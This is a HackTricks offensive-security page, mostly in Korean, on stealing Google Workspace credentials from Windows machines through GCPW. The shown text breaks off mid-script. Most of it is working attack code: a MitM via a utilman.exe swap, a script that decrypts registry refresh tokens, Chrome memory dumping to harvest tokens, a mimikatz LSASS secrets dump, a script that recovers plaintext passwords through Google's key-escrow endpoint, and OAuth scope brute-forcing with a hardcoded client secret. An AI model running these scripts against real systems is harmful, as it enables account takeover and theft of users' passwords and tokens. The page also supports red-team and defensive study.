# GWS - Workspace Sync Attacks (GCPW, GCDS, Directory Sync with AD & EntraID)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## GCPW - Google Credential Provider for Windows

이것은 Google Workspaces가 제공하는 단일 로그인으로, 사용자가 **자신의 Workspace 자격 증명**을 사용하여 Windows PC에 로그인할 수 있습니다. 또한, 이는 PC의 일부 위치에 Google Workspace에 접근하기 위한 토큰을 저장합니다.

{% hint style="success" %}
Note that [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) is capable to detect **GCPW**, get information about the configuration and **even tokens**.
{% endhint %}

### GCPW - MitM

사용자가 GCPW를 통해 Google Workspace와 동기화된 Windows PC에 접근할 때, 일반 로그인 양식을 완료해야 합니다. 이 로그인 양식은 PC가 새로 고침 토큰과 교환할 OAuth 코드를 반환합니다. 

{% code overflow="wrap" %}
```http
POST /oauth2/v4/token HTTP/2
Host: www.googleapis.com
Content-Length: 311
Content-Type: application/x-www-form-urlencoded
[...headers...]

scope=https://www.google.com/accounts/OAuthLogin
&grant_type=authorization_code
&client_id=77185425430.apps.googleusercontent.com
&client_secret=OTJgUOQcT7lO7GsGZq2G4IlT
&code=4/0AVG7fiQ1NKncRzNrrGjY5S02wBWBJxV9kUNSKvB1EnJDCWyDmfZvelqKp0zx8jRGmR7LUw
&device_id=d5c82f70-71ff-48e8-94db-312e64c7354f
&device_type=chrome
```
{% endcode %}

새로운 줄이 추가되어 가독성이 향상되었습니다.

{% hint style="info" %}
PC에 `Proxifier`를 설치하고 `utilman.exe` 바이너리를 `cmd.exe`로 덮어쓴 후 Windows 로그인 페이지에서 **접근성 기능**을 실행하여 MitM을 수행할 수 있었습니다. 이로 인해 **CMD**가 실행되며, 여기서 **Proxifier를 실행하고 구성**할 수 있습니다.\
`Proxifier`에서 QUICK UDP 트래픽을 **차단**하는 것을 잊지 마세요. 이렇게 하면 TCP 통신으로 다운그레이드되어 볼 수 있습니다.

또한 "서비스 및 기타 사용자"에서 두 가지 옵션을 구성하고 Windows에 Burp CA 인증서를 설치하세요.
{% endhint %}

또한 **`HKLM:\SOFTWARE\Google\GCPW`**에 `enable_verbose_logging = 1` 및 `log_file_path = C:\Public\gcpw.log` 키를 추가하면 일부 로그를 저장할 수 있습니다.

### GCPW - 지문

GCPW가 장치에 설치되어 있는지 확인하려면 다음 프로세스가 존재하는지 또는 다음 레지스트리 키가 존재하는지 확인할 수 있습니다:
```powershell
# Check process gcpw_extension.exe
if (Get-Process -Name "gcpw_extension" -ErrorAction SilentlyContinue) {
Write-Output "The process gcpw_xtension.exe is running."
} else {
Write-Output "The process gcpw_xtension.exe is not running."
}

# Check if HKLM\SOFTWARE\Google\GCPW\Users exists
$gcpwHKLMPath = "HKLM:\SOFTWARE\Google\GCPW\Users"
if (Test-Path $gcpwHKLMPath) {
Write-Output "GCPW is installed: The key $gcpwHKLMPath exists."
} else {
Write-Output "GCPW is not installed: The key $gcpwHKLMPath does not exist."
}

# Check if HKCU\SOFTWARE\Google\Accounts exists
$gcpwHKCUPath = "HKCU:\SOFTWARE\Google\Accounts"
if (Test-Path $gcpwHKCUPath) {
Write-Output "Google Accounts are present: The key $gcpwHKCUPath exists."
} else {
Write-Output "No Google Accounts found: The key $gcpwHKCUPath does not exist."
}
```
In **`HKCU:\SOFTWARE\Google\Accounts`**에서 사용자의 이메일과 암호화된 **refresh token**에 접근할 수 있습니다, 만약 사용자가 최근에 로그인했다면.

In **`HKLM:\SOFTWARE\Google\GCPW\Users`**에서 `domains_allowed` 키에 로그인할 수 있는 **domains**를 찾을 수 있으며, 하위 키에서는 이메일, 사진, 사용자 이름, 토큰 수명, 토큰 핸들 등 사용자에 대한 정보를 찾을 수 있습니다.

{% hint style="info" %}
토큰 핸들은 `eth.`로 시작하는 토큰으로, 다음과 같은 요청을 통해 일부 정보를 추출할 수 있습니다:

{% code overflow="wrap" %}
```bash
curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
-d 'token_handle=eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg'
# Example response
{
"audience": "77185425430.apps.googleusercontent.com",
"scope": "https://www.google.com/accounts/OAuthLogin",
"expires_in": 12880152
}
```
{% endcode %}

액세스 토큰의 토큰 핸들을 찾는 것도 가능한데, 다음과 같은 요청을 통해 가능합니다:

{% code overflow="wrap" %}
```bash
curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
-d 'access_token=<access token>'
# Example response
{
"issued_to": "77185425430.apps.googleusercontent.com",
"audience": "77185425430.apps.googleusercontent.com",
"scope": "https://www.google.com/accounts/OAuthLogin",
"expires_in": 1327,
"access_type": "offline",
"token_handle": "eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg"
}
```
{% endcode %}

내가 아는 한, 토큰 핸들에서 리프레시 토큰이나 액세스 토큰을 얻는 것은 불가능하다.
{% endhint %}

게다가, 파일 **`C:\ProgramData\Google\Credential Provider\Policies\<sid>\PolicyFetchResponse`**는 `enableDmEnrollment`, `enableGcpAutoUpdate`, `enableMultiUserLogin` (여러 사용자가 Workspace에서 컴퓨터에 로그인할 수 있는지 여부) 및 `validityPeriodDays` (사용자가 Google에 직접 재인증할 필요가 없는 일수)와 같은 다양한 **설정** 정보를 포함하는 json이다.

### GCPW - 레지스트리 리프레시 토큰

레지스트리 **`HKCU:\SOFTWARE\Google\Accounts`** 내에서 **`refresh_token`**이 암호화된 일부 계정을 찾을 수 있을 것이다. 메서드 **`ProtectedData.Unprotect`**는 이를 쉽게 복호화할 수 있다.

<details>

<summary><strong><code>HKCU:\SOFTWARE\Google\Accounts</code></strong> 데이터 가져오기 및 리프레시 토큰 복호화</summary>
```powershell
# Import required namespace for decryption
Add-Type -AssemblyName System.Security

# Base registry path
$baseKey = "HKCU:\SOFTWARE\Google\Accounts"

# Function to search and decrypt refresh_token values
function Get-RegistryKeysAndDecryptTokens {
param (
[string]$keyPath
)

# Get all values within the current key
$registryKey = Get-Item -Path $keyPath
$foundToken = $false

# Loop through properties to find refresh_token
foreach ($property in $registryKey.Property) {
if ($property -eq "refresh_token") {
$foundToken = $true
try {
# Get the raw bytes of the refresh_token from the registry
$encryptedTokenBytes = (Get-ItemProperty -Path $keyPath -Name $property).$property

# Decrypt the bytes using ProtectedData.Unprotect
$decryptedTokenBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedTokenBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
$decryptedToken = [System.Text.Encoding]::UTF8.GetString($decryptedTokenBytes)

Write-Output "Path: $keyPath"
Write-Output "Decrypted refresh_token: $decryptedToken"
Write-Output "-----------------------------"
}
catch {
Write-Output "Path: $keyPath"
Write-Output "Failed to decrypt refresh_token: $($_.Exception.Message)"
Write-Output "-----------------------------"
}
}
}

# Recursively process all subkeys
Get-ChildItem -Path $keyPath | ForEach-Object {
Get-RegistryKeysAndDecryptTokens -keyPath $_.PSPath
}
}

# Start the search from the base key
Get-RegistryKeysAndDecryptTokens -keyPath $baseKey
```
</details>

예시 출력:

{% code overflow="wrap" %}
```
Path: Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\SOFTWARE\Google\Accounts\100402336966965820570Decrypted refresh_token: 1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI
```
{% endcode %}

[**이 비디오**](https://www.youtube.com/watch?v=FEQxHRRP\_5I)에서 설명한 바와 같이, 레지스트리에서 토큰을 찾지 못한 경우 **`HKLM:\SOFTWARE\Google\GCPW\Users\<sid>\th`**에서 값을 수정(또는 삭제)할 수 있으며, 사용자가 컴퓨터에 다시 접근할 때 다시 로그인해야 하고 **토큰은 이전 레지스트리에 저장됩니다**.

### GCPW - 디스크 새로 고침 토큰

파일 **`%LocalAppData%\Google\Chrome\User Data\Local State`**는 사용자의 **Google Chrome 프로필** 내에 있는 **`refresh_tokens`**를 해독하는 키를 저장합니다:

* `%LocalAppData%\Google\Chrome\User Data\Default\Web Data`
* `%LocalAppData%\Google\Chrome\Profile*\Default\Web Data`

이러한 토큰에 접근하는 **C# 코드**는 [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe)에서 해독된 방식으로 찾을 수 있습니다.

또한, 암호화는 이 코드에서 찾을 수 있습니다: [https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216)

AESGCM이 사용되며, 암호화된 토큰은 **버전**(**`v10`** 현재)으로 시작하고, [**12B의 nonce**](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L42)가 있으며, 마지막으로 **16B의 mac**을 가진 **사이퍼 텍스트**가 있습니다.

### GCPW - 프로세스 메모리에서 토큰 덤프하기

다음 스크립트를 사용하여 `procdump`를 사용하여 모든 **Chrome** 프로세스를 **덤프**하고, **문자열**을 추출한 다음 **액세스 및 새로 고침 토큰**과 관련된 문자열을 **검색**할 수 있습니다. Chrome이 일부 Google 사이트에 연결되어 있다면, 일부 **프로세스가 메모리에 새로 고침 및/또는 액세스 토큰을 저장하고 있을 것입니다!**

<details>

<summary>Chrome 프로세스 덤프 및 토큰 검색</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

`gcpw_extension.exe`로 같은 시도를 했지만 어떤 토큰도 찾지 못했습니다.

어떤 이유로 인해, **일부 추출된 액세스 토큰은 유효하지 않을 것입니다 (일부는 유효할 수 있습니다)**. 덤프에서 유효한 토큰을 얻기 위해 문자를 하나씩 제거하는 다음 스크립트를 시도했습니다. 유효한 토큰을 찾는 데는 도움이 되지 않았지만, 아마도 도움이 될 수 있습니다:

<details>

<summary>문자를 하나씩 제거하여 액세스 토큰 확인</summary>
```bash
#!/bin/bash

# Define the initial access token
access_token="ya29.a0AcM612wWX6Pe3Pc6ApZYknGs5n66W1Hr1CQvF_L_pIm3uZaXWisWFabzxheYCHErRn28l2UOJuAbMzfn1TUpSKqvYvlhXJpxQsKEtwhYXzN2BZdOQNji0EXfF7po1_0WaxhwqOiE0CFQciiL8uAmkRsoXhq9ekC_S8xLrODZ2yKdDR6gSFULWaiIG-bOCFx3DkbOdbjAk-U4aN1WbglUAJdLZh7DMzSucIIZwKWvBxqqajSAjrdW0mRNVN2IfkcVLPndwj7fQJV2bQaCgYKAbQSAQ4SFQHGX2MiPuU1D-9-YHVzaFlUo_RwXA0277"

# Define the URL for the request
url="https://www.googleapis.com/oauth2/v1/tokeninfo"

# Loop until the token is 20 characters or the response doesn't contain "error_description"
while [ ${#access_token} -gt 20 ]; do
# Make the request and capture the response
response=$(curl -s -H "Content-Type: application/x-www-form-urlencoded" -d "access_token=$access_token" $url)

# Check if the response contains "error_description"
if [[ ! "$response" =~ "error_description" ]]; then
echo "Success: Token is valid"
echo "Final token: $access_token"
echo "Response: $response"
exit 0
fi

# Remove the last character from the token
access_token=${access_token:0:-1}

echo "Token length: ${#access_token}"
done

echo "Error: Token invalid or too short"
```
</details>

### GCPW - 평문 비밀번호 복구

GCPW를 악용하여 비밀번호의 평문을 복구하려면 **mimikatz**를 사용하여 **LSASS**에서 암호화된 비밀번호를 덤프할 수 있습니다:
```bash
mimikatz_trunk\x64\mimikatz.exe token::elevate lsadump::secrets exit
```
그런 다음 이미지와 같이 `Chrome-GCPW-<sid>`와 같은 비밀을 검색합니다:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-6044191430395675441-x.jpg" alt=""><figcaption></figcaption></figure>

그런 다음, `https://www.google.com/accounts/OAuthLogin` 범위를 가진 **액세스 토큰**으로 비밀번호를 복호화할 개인 키를 요청할 수 있습니다:

<details>

<summary>액세스 토큰, 암호화된 비밀번호 및 리소스 ID를 사용하여 평문 비밀번호를 얻기 위한 스크립트</summary>
```python
import requests
from base64 import b64decode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA

def get_decryption_key(access_token, resource_id):
try:
# Request to get the private key
response = requests.get(
f"https://devicepasswordescrowforwindows-pa.googleapis.com/v1/getprivatekey/{resource_id}",
headers={
"Authorization": f"Bearer {access_token}"
}
)

# Check if the response is successful
if response.status_code == 200:
private_key = response.json()["base64PrivateKey"]
# Properly format the RSA private key
private_key = f"-----BEGIN RSA PRIVATE KEY-----\n{private_key.strip()}\n-----END RSA PRIVATE KEY-----"
return private_key
else:
raise ValueError(f"Failed to retrieve private key: {response.text}")

except requests.RequestException as e:
print(f"Error occurred while requesting the private key: {e}")
return None

def decrypt_password(access_token, lsa_secret):
try:
# Obtain the private key using the resource_id
resource_id = lsa_secret["resource_id"]
encrypted_data = b64decode(lsa_secret["encrypted_password"])

private_key_pem = get_decryption_key(access_token, resource_id)
print("Found private key:")
print(private_key_pem)

if private_key_pem is None:
raise ValueError("Unable to retrieve the private key.")

# Load the RSA private key
rsa_key = RSA.import_key(private_key_pem)
key_size = int(rsa_key.size_in_bits() / 8)

# Decrypt the encrypted data
cipher_rsa = PKCS1_OAEP.new(rsa_key)
session_key = cipher_rsa.decrypt(encrypted_data[:key_size])

# Extract the session key and other data from decrypted payload
session_header = session_key[:32]
session_nonce = session_key[32:]
mac = encrypted_data[-16:]

# Decrypt the AES GCM data
aes_cipher = AES.new(session_header, AES.MODE_GCM, nonce=session_nonce)
decrypted_password = aes_cipher.decrypt_and_verify(encrypted_data[key_size:-16], mac)

print("Decrypted Password:", decrypted_password.decode("utf-8"))

except Exception as e:
print(f"Error occurred during decryption: {e}")

# CHANGE THIS INPUT DATA!
access_token = "<acces_token>"
lsa_secret = {
"encrypted_password": "<encrypted-password>",
"resource_id": "<resource-id>"
}

decrypt_password(access_token, lsa_secret)
```
</details>

이것의 주요 구성 요소를 Chromium 소스 코드에서 찾는 것이 가능합니다:

* API 도메인: [https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code](https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code)
* API 엔드포인트: [https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70](https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70)

### GCPW - 리프레시 토큰으로 액세스 토큰 생성하기

리프레시 토큰을 사용하여 다음 명령어에 지정된 클라이언트 ID와 클라이언트 비밀을 사용하여 액세스 토큰을 생성할 수 있습니다:
```bash
curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCPW - Scopes

{% hint style="info" %}
리프레시 토큰이 있더라도, **액세스 토큰을 생성하는 애플리케이션에서 지원하는 범위**만 요청할 수 있기 때문에 액세스 토큰에 대한 모든 범위를 요청하는 것은 불가능합니다.

또한, 리프레시 토큰은 모든 애플리케이션에서 유효하지 않습니다.
{% endhint %}

기본적으로 GCPW는 사용자가 모든 가능한 OAuth 범위에 접근할 수 없으므로, 다음 스크립트를 사용하여 `refresh_token`으로 `access_token`을 생성하는 데 사용할 수 있는 범위를 찾을 수 있습니다:

<details>

<summary>Bash script to brute-force scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

그리고 이것은 제가 작성 당시 받은 출력입니다:
```
Valid scopes:
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
```
또한, Chromium 소스 코드를 확인하면 [**이 파일을 찾을 수 있습니다**](https://github.com/chromium/chromium/blob/5301790cd7ef97088d4862465822da4cb2d95591/google\_apis/gaia/gaia\_constants.cc#L24), 이 파일에는 **이전에 무차별 대입 공격으로 발견되지 않은 다른 범위**가 포함되어 있습니다. 따라서 이러한 추가 범위는 다음과 같이 가정할 수 있습니다:

<details>

<summary>추가 범위</summary>
```
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/aidahttps://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome
```
</details>

가장 흥미로운 것은 아마도:
```c
// OAuth2 scope for access to all Google APIs.
const char kAnyApiOAuth2Scope[] = "https://www.googleapis.com/auth/any-api";
```
하지만, 저는 이 범위를 사용하여 gmail에 접근하거나 그룹을 나열하려고 했지만 작동하지 않았습니다. 그래서 여전히 얼마나 유용한지 모르겠습니다.

**모든 범위로 액세스 토큰 가져오기**:

<details>

<summary>모든 범위로 refresh_token에서 액세스 토큰을 생성하는 Bash 스크립트</summary>
```bash
export scope=$(echo "https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
